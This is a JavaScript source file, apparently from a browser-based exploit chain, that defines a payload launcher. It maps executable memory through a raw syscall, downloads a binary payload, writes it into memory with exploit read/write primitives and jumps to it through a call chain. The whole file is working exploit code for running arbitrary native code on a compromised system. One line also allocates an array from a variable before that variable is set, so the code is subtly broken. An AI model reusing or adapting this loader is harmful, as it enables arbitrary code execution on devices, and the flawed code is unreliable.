window.PayloadLauncher = function (SourcePrim, SourceChain) {
	this.Prim = SourcePrim;
	this.Chain = SourceChain;
	this.BufferAddress = new int64(0x26200000, 0x00000009);
	this.BufferLength = 0x300000;// 0x926400000 - 0x926100000 - 0x100000
	this.Buffer = this.Chain.syscall(477, this.BufferAddress, this.BufferLength, 7, 0x41000, -1, 0);

	this.LaunchPayload = function (PayloadPath, /*Callback, */Replacements) {
		msgtext.innerHTML = "a";

		var Prim = this.Prim;
		var Chain = this.Chain;
		var BufferAddress = this.BufferAddress;
		var BufferLength = this.BufferLength;
		var Buffer = this.Buffer;//

		var SourceXMLHttpRequest = new XMLHttpRequest();

		SourceXMLHttpRequest.responseType = "arraybuffer";
		SourceXMLHttpRequest.open("GET", PayloadPath, true);
		SourceXMLHttpRequest.onreadystatechange = function () {
			if (SourceXMLHttpRequest.readyState == 4) {
				msgtext.innerHTML = "b";
				var Response = SourceXMLHttpRequest.response;
				var ResponseLength = Response.byteLength;
				var ResponseLengthRemainderTo32 = (4 - (ResponseLength % 4)) % 4;
				var Payload;
				var PayloadLength = ResponseLength + ResponseLengthRemainderTo32;
				var PayloadIndex;
				var Payload32 = new Uint32Array(Payload32Length);
				var Payload32Length = PayloadLength / 4;;
				var Payload32Index;
				var PayloadAddress = BufferAddress.add32(0x100000);
				var PayloadAddressIndex;

				Payload = new Uint8Array(PayloadLength);

				// loading payload

				msgtext.innerHTML = "c";
				Payload.set(new Uint8Array(Response), 0);

				for (var ResponseLengthRemainderTo32Index = 0; ResponseLengthRemainderTo32Index < ResponseLengthRemainderTo32; ResponseLengthRemainderTo32Index++)
					Payload[ResponseLength + ResponseLengthRemainderTo32Index] = 0;

				// applying replacements

				msgtext.innerHTML = "d";
				if (Replacements != undefined && Replacements != null) {
					var ReplacementsLength = Replacements.length;

					for (var ReplacementsIndex = 0; ReplacementsIndex < ReplacementsLength; ReplacementsIndex++)
						Payload[Replacements[ReplacementsIndex][0]] = Replacements[ReplacementsIndex][1];
				}

				// converting payload

				msgtext.innerHTML = "e";
				for (PayloadIndex = 0, Payload32Index = 0; Payload32Index < Payload32Length; PayloadIndex += 4, Payload32Index++)
					Payload32[Payload32Index] = (Payload[PayloadIndex + 3] << 24) | (Payload[PayloadIndex + 2] << 16) | (Payload[PayloadIndex + 1] << 8) | Payload[PayloadIndex];

				// writing payload in buffer

				msgtext.innerHTML = "f";
				for (PayloadAddressIndex = 0, Payload32Index = 0; Payload32Index < Payload32Length; PayloadAddressIndex += 4, Payload32Index++)
					Prim.write4(PayloadAddress.add32(PayloadAddressIndex), Payload32[Payload32Index]);

				// calling buffer

				msgtext.innerHTML = "g";
				Chain.call(Buffer);// might try fcall buffer address

				// clearing buffer

				msgtext.innerHTML = "h";
				for (var BufferIndex = 0; BufferIndex < BufferLength; BufferIndex += 8)
					Prim.write8(BufferAddress.add32(BufferIndex), 0);

				//callback
			}
		};

		SourceXMLHttpRequest.send();
	};

	return this;
};
